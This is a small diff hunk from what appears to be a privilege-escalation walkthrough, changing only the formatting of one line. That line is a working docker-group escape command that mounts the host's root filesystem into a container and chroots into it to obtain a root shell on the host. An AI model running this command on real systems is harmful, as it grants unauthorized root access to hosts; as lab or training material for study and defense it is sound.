@@ -38,7 +38,7 @@ Step 2 — Exploit (the module's exact technique)
 
 If you're in the docker group (or socket is writable), mount the host's root filesystem into a container and chroot into it:<br>
 
-# docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash  <br>
+#docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash  <br>
 
 This drops you into a root shell on the HOST system (not just the container).
 
